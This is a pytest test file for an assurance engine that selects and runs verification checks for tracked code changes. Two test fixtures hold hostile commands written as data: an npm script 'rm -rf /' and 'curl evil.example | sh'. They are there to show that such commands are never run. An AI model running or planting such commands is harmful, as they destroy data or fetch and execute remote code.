from __future__ import annotations

import json
from datetime import UTC, datetime
from uuid import uuid4

import pytest

from backend.app.assurance import discovery as disc
from backend.app.assurance.engine import AssuranceEngine, contract_digest, summarize
from backend.app.assurance.models import DeviationCategory
from backend.app.contracts.models import (
    AssuranceRun, AssuranceStatus, ChangeContract, ChangeView, DependencyChange,
    DependencyReport, EnvironmentPassport, EvidenceStatus, ReviewState, RiskLevel,
    VerificationResult, VerificationStatus,
)
from backend.app.contracts.ports import AssurancePort
from backend.app.core.errors import AppError
from backend.app.git.state import GitStateTracker
from backend.tests.support_kb import git, make_repo, write

NOW = datetime(2026, 1, 1, tzinfo=UTC)
state = GitStateTracker()
PYTEST_FILES = {"pyproject.toml": "[tool.pytest.ini_options]\n", "app.py": "x = 1\n",
                "tests/test_app.py": "def test_ok():\n    assert True\n"}


class FakeRunner:
    def __init__(self, results=None, error=None):
        self.calls = []
        self.results = results or {}
        self.error = error

    def run(self, repository_path, request, output_limit_bytes):
        self.calls.append((repository_path, request, output_limit_bytes))
        if self.error:
            raise self.error
        status, code, out = self.results.get(request.args[-1] if request.args else "",
                                             (VerificationStatus.PASSED, 0, "ok"))
        return VerificationResult(
            executable=request.executable, args=request.args, status=status, exit_code=code,
            duration_ms=5, stdout=out, stderr="", started_at=NOW, completed_at=NOW)


def change_view(repo, **contract):
    return ChangeView(id=uuid4(), title="t", intent="i", repository_path=str(repo), created_at=NOW,
                      updated_at=NOW, review_state=ReviewState.NO_CHANGES, risk_level=RiskLevel.LOW,
                      contract=ChangeContract(**contract))


def capture(repo, change):
    return state.capture(change.id, "cp", str(repo), 1, 200_000)


def environment(change, status=EvidenceStatus.CURRENT):
    return EnvironmentPassport(id=uuid4(), change_id=change.id, captured_at=NOW, status=status,
                               limitations=["x"] if status is not EvidenceStatus.CURRENT else [])


def deps(change, cp, changes=(), unsupported=()):
    return DependencyReport(id=uuid4(), change_id=change.id, checkpoint_id=cp.id, captured_at=NOW,
                            changes=list(changes), unsupported_ecosystems=list(unsupported))


def plan_for(repo, files_to_change=None, engine=None, with_evidence=True, **contract):
    for name, text in (files_to_change or {}).items():
        write(repo, name, text)
    change = change_view(repo, **contract)
    cp = capture(repo, change)
    engine = engine or AssuranceEngine(FakeRunner())
    plan = engine.discover(change, cp, environment(change) if with_evidence else None,
                           deps(change, cp) if with_evidence else None)
    return engine, change, cp, plan


def ids(plan):
    return [c.id for c in plan.checks]


# -- discovery and selection --------------------------------------------------------

def test_port_conformance_and_defaults():
    assert isinstance(AssuranceEngine(), AssurancePort)
    for bad in (0, 301, True, 1.5):
        with pytest.raises(ValueError):
            AssuranceEngine(check_timeout_seconds=bad)


def test_python_source_change_selects_pytest_with_rationale(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    _, change, cp, plan = plan_for(repo, {"app.py": "x = 2\n"})
    assert ids(plan) == ["pytest", "pip-check"][:1] or "pytest" in ids(plan)
    check = next(c for c in plan.checks if c.id == "pytest")
    assert check.executable == "python" and "-B" in check.args and "no:cacheprovider" in check.args
    assert not check.required and "changed python source" in check.rationale.lower()
    assert plan.checkpoint_id == cp.id and plan.change_id == change.id
    assert "Checks run with the runtime's interpreter" in " ".join(plan.coverage_gaps)


def test_no_change_no_required_checks_selects_nothing_and_says_so(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    _, _, _, plan = plan_for(repo)
    assert plan.checks == []
    assert any("no assurance was selected" in gap for gap in plan.coverage_gaps)


def test_contract_required_checks_by_id_alias_and_missing(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    _, _, _, plan = plan_for(repo, required_checks=["PyTest", "no-such-check"])
    check = next(c for c in plan.checks if c.id == "pytest")
    assert check.required and "Required by the Change Contract." in check.rationale
    assert "Required check 'no-such-check' was not discovered in this repository." in plan.coverage_gaps
    _, _, _, by_kind = plan_for(make_repo(tmp_path / "r2", PYTEST_FILES), required_checks=["test"])
    assert next(c for c in by_kind.checks if c.id == "pytest").required


def test_changed_source_without_test_runner_is_a_gap(tmp_path):
    repo = make_repo(tmp_path / "r", {"lib.py": "x=1\n"})
    _, _, _, plan = plan_for(repo, {"lib.py": "x=2\n"})
    assert plan.checks == []
    assert "Changed python source has no discovered test runner." in plan.coverage_gaps


def test_lint_typecheck_and_dependency_checks(tmp_path):
    repo = make_repo(tmp_path / "r", {
        **PYTEST_FILES,
        "pyproject.toml": "[tool.pytest.ini_options]\n[tool.ruff]\n[tool.mypy]\n",
        "requirements.txt": "a==1\n"})
    engine, change, cp, _ = plan_for(repo)
    write(repo, "app.py", "x = 3\n")
    cp = capture(repo, change)
    dep = DependencyChange(ecosystem="python", package="a", source_path="requirements.txt")
    plan = engine.discover(change, cp, environment(change), deps(change, cp, [dep]))
    assert set(ids(plan)) == {"pytest", "ruff", "mypy", "pip-check"}
    assert ids(plan) == sorted(ids(plan), key=lambda i: ["pytest", "ruff", "mypy", "pip-check"].index(i))
    assert next(c for c in plan.checks if c.id == "mypy").args[-2].startswith("--cache-dir=")


def test_dependency_only_change_selects_test_runner_and_security(tmp_path):
    repo = make_repo(tmp_path / "r", {**PYTEST_FILES, "requirements.txt": "a==1\n"})
    engine, change, cp, _ = plan_for(repo, {"requirements.txt": "a==2\n"})
    dep = DependencyChange(ecosystem="python", package="a", source_path="requirements.txt")
    plan = engine.discover(change, cp, environment(change), deps(change, cp, [dep]))
    assert {"pytest", "pip-check"} <= set(ids(plan))
    assert "python dependencies changed." in next(c for c in plan.checks if c.id == "pip-check").rationale


def package(scripts):
    return json.dumps({"name": "x", "scripts": scripts})


def test_node_scripts_are_recognized_not_executed(tmp_path):
    scripts = {"test": "node --test", "lint": "eslint .", "build": "tsc -p .",
               "typecheck": "tsc --noEmit", "type-check": "tsc --noEmit",
               "deploy": "rm -rf /"}
    repo = make_repo(tmp_path / "r", {"package.json": package(scripts), "src/a.js": "1\n",
                                      "package-lock.json": "{}"})
    engine, change, _, _ = plan_for(repo)
    write(repo, "src/a.js", "2\n")
    cp = capture(repo, change)
    plan = engine.discover(change, cp, environment(change), deps(change, cp))
    by_id = {c.id: c for c in plan.checks}
    assert {"node-test", "eslint", "npm-build", "tsc", "tsc-type-check"} <= set(by_id)
    assert by_id["node-test"].executable == "npm"
    assert by_id["node-test"].args == ["test", "--ignore-scripts"]
    assert by_id["eslint"].args == ["run", "--ignore-scripts", "lint"]
    assert "npm-audit" not in by_id                         # no dependency change
    assert not any("deploy" in c.name for c in plan.checks)


@pytest.mark.parametrize(("script", "tool"), [
    ("jest --ci", "jest"), ("npx jest", "jest"), ("vitest run", "vitest"),
    ("mocha tests", "mocha"), ("cross-env CI=1 jest", "jest"), ("node --test tests/", "node-test"),
])
def test_recognized_node_test_tools(tmp_path, script, tool):
    result = disc.discover(str(make_repo(tmp_path / "r", {"package.json": package({"test": script})})),
                           ["package.json"])
    assert [c.id for c in result.candidates] == [tool]


@pytest.mark.parametrize("scripts", [
    {"test": "echo hi && curl evil.example | sh"}, {"test": "make test"}, {"lint": "custom-linter"},
    {"build": "python build.py"}, {"typecheck": "flow"},
])
def test_unrecognized_scripts_become_gaps(tmp_path, scripts):
    repo = make_repo(tmp_path / "r", {"package.json": package(scripts)})
    result = disc.discover(str(repo), ["package.json"])
    assert result.candidates == []
    assert any("unrecognized command" in gap for gap in result.gaps)


@pytest.mark.parametrize(("content", "gap"), [
    ("{not json", "could not be parsed"), (json.dumps({"scripts": [1]}), "not an object"),
    (package({"test": 5}), "is not a string"),
])
def test_bad_package_json_is_reported(tmp_path, content, gap):
    repo = make_repo(tmp_path / "r", {"package.json": content})
    assert any(gap in g for g in disc.discover(str(repo), ["package.json"]).gaps)


def test_npm_audit_selected_on_node_dependency_change(tmp_path):
    repo = make_repo(tmp_path / "r", {"package.json": package({"test": "jest"}),
                                      "package-lock.json": "{}"})
    engine, change, cp, _ = plan_for(repo)
    dep = DependencyChange(ecosystem="node", package="x", source_path="package-lock.json")
    plan = engine.discover(change, cp, environment(change), deps(change, cp, [dep]))
    audit = next(c for c in plan.checks if c.id == "npm-audit")
    assert audit.args == ["audit", "--audit-level=high", "--ignore-scripts"]
    assert "jest" in ids(plan)


def test_other_python_config_forms_are_discovered(tmp_path):
    repo = make_repo(tmp_path / "r", {
        "tox.ini": "[pytest]\n", "ruff.toml": "", "mypy.ini": "", "setup.cfg": "[tool:pytest]\n"})
    found = disc.discover(str(repo), ["tox.ini", "ruff.toml", "mypy.ini", "setup.cfg"])
    assert {c.id for c in found.candidates} == {"pytest", "ruff", "mypy"}
    setup_only = disc.discover(str(make_repo(tmp_path / "r2", {"setup.cfg": "[tool:pytest]\n"})),
                               ["setup.cfg"])
    assert [c.id for c in setup_only.candidates] == ["pytest"]
    assert disc.discover(str(repo), ["test_x.py"]).candidates[0].id == "pytest"
    assert disc.discover(str(repo), ["src/a_test.py"]).candidates[0].id == "pytest"
    assert disc.discover(str(repo), ["src/plain.py"]).candidates == []


def test_missing_and_partial_evidence_are_explicit_gaps(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    _, _, _, plan = plan_for(repo, with_evidence=False)
    assert "Environment evidence is missing." in plan.coverage_gaps
    assert "Dependency evidence is missing." in plan.coverage_gaps
    engine = AssuranceEngine(FakeRunner())
    change = change_view(repo)
    cp = capture(repo, change)
    plan = engine.discover(change, cp, environment(change, EvidenceStatus.PARTIAL),
                           deps(change, cp, unsupported=["node: yarn.lock (format not supported)"]))
    assert any(g.startswith("Environment evidence is partial") for g in plan.coverage_gaps)
    assert "Dependency evidence unsupported: node: yarn.lock (format not supported)" in plan.coverage_gaps


def test_truncated_patch_and_untracked_files_are_gaps(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    write(repo, "app.py", "y = 1\n" * 500)
    write(repo, "new_file.txt", "n")
    change = change_view(repo)
    cp = state.capture(change.id, "cp", str(repo), 1, 32)
    plan = AssuranceEngine(FakeRunner()).discover(change, cp, environment(change), deps(change, cp))
    assert "Patch evidence was truncated; deviation analysis covers paths only." in plan.coverage_gaps
    assert "Untracked file contents are not part of the patch evidence." in plan.coverage_gaps


def test_missing_tool_is_a_gap(tmp_path, monkeypatch):
    repo = make_repo(tmp_path / "r", {"package.json": package({"test": "jest"})})
    monkeypatch.setattr("backend.app.assurance.engine.find_executable", lambda *a, **k: None)
    _, _, _, plan = plan_for(repo, required_checks=["jest"])
    assert "Tool 'npm' was not found; check 'jest' cannot run." in plan.coverage_gaps


def test_discovery_is_deterministic(tmp_path):
    repo = make_repo(tmp_path / "r", {**PYTEST_FILES, "pyproject.toml": "[tool.pytest.ini_options]\n[tool.ruff]\n"})
    engine, change, cp, first = plan_for(repo, {"app.py": "x = 9\n"})
    second = engine.discover(change, cp, environment(change), deps(change, cp))
    assert [c.model_dump() for c in first.checks] == [c.model_dump() for c in second.checks]
    assert first.coverage_gaps == second.coverage_gaps


# -- run --------------------------------------------------------------------------

def test_run_maps_every_status_and_binds_evidence(tmp_path):
    repo = make_repo(tmp_path / "r", {"pyproject.toml": "[tool.pytest.ini_options]\n[tool.ruff]\n[tool.mypy]\n",
                                      "app.py": "1\n", "requirements.txt": "a"})
    runner = FakeRunner(results={
        "pytest": (VerificationStatus.PASSED, 0, "ok"),
        "no:cacheprovider": (VerificationStatus.FAILED, 1, "bad"),
        ".": (VerificationStatus.TIMED_OUT, None, ""),
    })
    engine = AssuranceEngine(runner)
    engine, change, cp, plan = plan_for(repo, {"app.py": "2\n"}, engine=engine,
                                        required_checks=["pytest", "ruff", "mypy"])
    runs = engine.run(change, plan, str(repo), 5000)
    by = {r.check_id: r for r in runs}
    assert by["pytest"].status is AssuranceStatus.FAILED and by["pytest"].exit_code == 1
    assert by["ruff"].status is AssuranceStatus.TIMED_OUT
    assert all(r.plan_id == plan.id and r.checkpoint_id == cp.id and r.change_id == change.id for r in runs)
    assert [r.check_id for r in runs] == ids(plan)
    assert all(call[2] == 5000 for call in runner.calls)


def test_runner_apperror_becomes_error_run(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine = AssuranceEngine(FakeRunner(error=AppError("X", "boom message")))
    engine, change, _, plan = plan_for(repo, {"app.py": "2\n"}, engine=engine)
    runs = engine.run(change, plan, str(repo), 100)
    assert runs[0].status is AssuranceStatus.ERROR and runs[0].stderr == "boom message"


def test_stale_repository_skips_every_check(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    runner = FakeRunner()
    engine, change, _, plan = plan_for(repo, {"app.py": "2\n"}, engine=AssuranceEngine(runner))
    write(repo, "app.py", "3\n")
    runs = engine.run(change, plan, str(repo), 100)
    assert {r.status for r in runs} == {AssuranceStatus.SKIPPED}
    assert "repository changed" in runs[0].stderr and runner.calls == []


def test_contract_change_makes_plan_stale(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine, change, _, plan = plan_for(repo, {"app.py": "2\n"})
    edited = change.model_copy(update={"contract": ChangeContract(required_checks=["other"])})
    assert contract_digest(edited) != contract_digest(change)
    runs = engine.run(edited, plan, str(repo), 100)
    assert runs[0].status is AssuranceStatus.SKIPPED and "Contract changed" in runs[0].stderr
    other = change.model_copy(update={"id": uuid4()})
    assert "different Change" in engine.run(other, plan, str(repo), 100)[0].stderr


def test_unknown_or_modified_plans_are_refused(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine, change, cp, plan = plan_for(repo, {"app.py": "2\n"})
    fresh_engine = AssuranceEngine(FakeRunner())
    with pytest.raises(AppError) as info:
        fresh_engine.run(change, plan, str(repo), 100)
    assert info.value.code == "ASSURANCE_PLAN_UNKNOWN" and info.value.status_code == 409
    tampered = plan.model_copy(update={"checks": []})
    with pytest.raises(AppError):
        engine.run(change, tampered, str(repo), 100)
    fresh_engine.remember(change, plan, cp)          # rehydration after a restart
    assert fresh_engine.run(change, plan, str(repo), 100)
    with pytest.raises(AppError) as info:
        fresh_engine.remember(change, plan, capture(repo, change))
    assert info.value.code == "ASSURANCE_CHECKPOINT_MISMATCH"


def test_reinspection_failure_is_treated_as_stale(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine, change, _, plan = plan_for(repo, {"app.py": "2\n"})
    import shutil
    shutil.rmtree(repo / ".git", ignore_errors=True)
    runs = engine.run(change, plan, str(repo), 100)
    assert runs[0].status is AssuranceStatus.SKIPPED and "could not be re-inspected" in runs[0].stderr


# -- evaluate ---------------------------------------------------------------------

def run_for(plan, check_id, status, code=0, out=""):
    return AssuranceRun(id=uuid4(), change_id=plan.change_id, plan_id=plan.id,
                        checkpoint_id=plan.checkpoint_id, check_id=check_id, status=status,
                        exit_code=code, duration_ms=1, stdout=out, started_at=NOW, completed_at=NOW)


def test_evaluate_decision_table(tmp_path):
    repo = make_repo(tmp_path / "r", {"pyproject.toml": "[tool.pytest.ini_options]\n[tool.ruff]\n",
                                      "app.py": "1\n", "tests/test_a.py": "def test_a(): pass\n"})
    engine, change, cp, plan = plan_for(repo, {"app.py": "2\n"}, required_checks=["pytest"])
    assert set(ids(plan)) == {"pytest", "ruff"}

    all_pass = [run_for(plan, "pytest", AssuranceStatus.PASSED, out="== 1 passed in 0.1s =="),
                run_for(plan, "ruff", AssuranceStatus.PASSED)]
    evaluation = engine.evaluate(change, plan, all_pass)
    assert evaluation.fresh and evaluation.required_assurance_passed and evaluation.assurance_fresh
    assert evaluation.deviations_resolved and evaluation.failed == [] and evaluation.missing_required == []
    assert evaluation.status is EvidenceStatus.PARTIAL       # coverage gaps remain
    assert evaluation.results[0].summary == "1 passed"

    optional_failed = [all_pass[0], run_for(plan, "ruff", AssuranceStatus.FAILED, 1)]
    assert engine.evaluate(change, plan, optional_failed).required_assurance_passed is True
    assert engine.evaluate(change, plan, optional_failed).failed == ["ruff"]

    required_failed = [run_for(plan, "pytest", AssuranceStatus.FAILED, 1), all_pass[1]]
    assert engine.evaluate(change, plan, required_failed).required_assurance_passed is False

    missing = engine.evaluate(change, plan, [all_pass[1]])
    assert missing.missing_required == ["pytest"] and not missing.required_assurance_passed
    assert not missing.required_evidence_complete
    assert any("Required check 'pytest' has no passing result." in g for g in missing.coverage_gaps)

    skipped = engine.evaluate(change, plan, [run_for(plan, "pytest", AssuranceStatus.SKIPPED, None), all_pass[1]])
    assert skipped.missing_required == ["pytest"]

    empty = engine.evaluate(change, plan, [])
    assert empty.status is EvidenceStatus.MISSING and not empty.required_assurance_passed


def test_evaluate_invalidates_when_evidence_moves(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine, change, cp, plan = plan_for(repo, {"app.py": "2\n"})
    runs = [run_for(plan, "pytest", AssuranceStatus.PASSED)]
    assert engine.evaluate(change, plan, runs).fresh
    write(repo, "app.py", "3\n")
    stale = engine.evaluate(change, plan, runs)
    assert stale.status is EvidenceStatus.STALE and not stale.assurance_fresh
    assert not stale.required_assurance_passed
    assert "The repository changed after the checkpoint." in stale.freshness_reasons
    later = capture(repo, change)
    assert not engine.evaluate(change, plan, runs, current_checkpoint=later).fresh
    assert engine.evaluate(change, plan, runs, current_checkpoint=cp).fresh
    edited = change.model_copy(update={"contract": ChangeContract(max_risk=RiskLevel.LOW)})
    assert "The Change Contract changed after the plan was made." in \
        engine.evaluate(edited, plan, runs, current_checkpoint=cp).freshness_reasons


def test_evaluate_rejects_runs_from_other_evidence(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine, change, cp, plan = plan_for(repo, {"app.py": "2\n"})
    alien = run_for(plan, "pytest", AssuranceStatus.PASSED).model_copy(update={"plan_id": uuid4()})
    result = engine.evaluate(change, plan, [alien], current_checkpoint=cp)
    assert not result.fresh and not result.required_assurance_passed
    assert "belongs to different evidence" in result.freshness_reasons[0]


def test_nothing_required_still_needs_one_clean_pass(tmp_path):
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine, change, cp, plan = plan_for(repo, {"app.py": "2\n"})
    assert not engine.evaluate(change, plan, [], current_checkpoint=cp).required_assurance_passed
    ok = [run_for(plan, "pytest", AssuranceStatus.PASSED)]
    assert engine.evaluate(change, plan, ok, current_checkpoint=cp).required_assurance_passed
    bad = [run_for(plan, "pytest", AssuranceStatus.ERROR, None)]
    assert not engine.evaluate(change, plan, bad, current_checkpoint=cp).required_assurance_passed
    empty_repo = make_repo(tmp_path / "e", {"a.txt": "1"})
    e_engine, e_change, e_cp, e_plan = plan_for(empty_repo)
    assert not e_engine.evaluate(e_change, e_plan, [], current_checkpoint=e_cp).required_assurance_passed


def test_evaluate_reports_contract_deviations(tmp_path):
    repo = make_repo(tmp_path / "r", {**PYTEST_FILES, ".env": "A=1\n"})
    engine, change, cp, plan = plan_for(repo, {".env": "A=2\n", "app.py": "2\n"},
                                        forbidden_paths=[".env"], allowed_paths=["*.py", ".env"])
    result = engine.evaluate(change, plan, [run_for(plan, "pytest", AssuranceStatus.PASSED)],
                             current_checkpoint=cp)
    assert not result.deviations_resolved
    assert any(d.category is DeviationCategory.FORBIDDEN_PATH and d.subject == ".env"
               for d in result.deviations)
    assert engine.analyze_deviations(change, cp) == result.deviations


def test_summarize_reporters():
    def make(out, err=""):
        return AssuranceRun(id=uuid4(), change_id=uuid4(), plan_id=uuid4(), checkpoint_id=uuid4(),
                            check_id="x", status=AssuranceStatus.PASSED, duration_ms=1,
                            stdout=out, stderr=err, started_at=NOW, completed_at=NOW)

    assert summarize("pytest", make("==== 2 failed, 3 passed in 1.20s ====")) == "2 failed, 3 passed"
    assert summarize("node-test", make("# pass 4\n# fail 1\n")) == "4 pass, 1 fail"
    assert summarize("jest", make("Tests:       1 failed, 2 passed, 3 total")) == "1 failed, 2 passed, 3 total"
    assert summarize("ruff", make("a\nAll checks passed!\n")) == "All checks passed!"
    assert summarize("pytest", make("", "")) == ""
    assert summarize("pytest", make("weird output")) == "weird output"
    assert len(summarize("ruff", make("x" * 1000))) == 300


def test_remembered_plans_are_bounded(tmp_path, monkeypatch):
    from backend.app.assurance import engine as module
    monkeypatch.setattr(module, "MAX_REMEMBERED_PLANS", 2)
    repo = make_repo(tmp_path / "r", PYTEST_FILES)
    engine, change, cp, first = plan_for(repo, {"app.py": "2\n"})
    plans = [first] + [engine.discover(change, cp, None, None) for _ in range(2)]
    assert len(engine._plans) == 2
    with pytest.raises(AppError):
        engine.evaluate(change, plans[0], [], current_checkpoint=cp)
    assert engine.evaluate(change, plans[-1], [], current_checkpoint=cp)
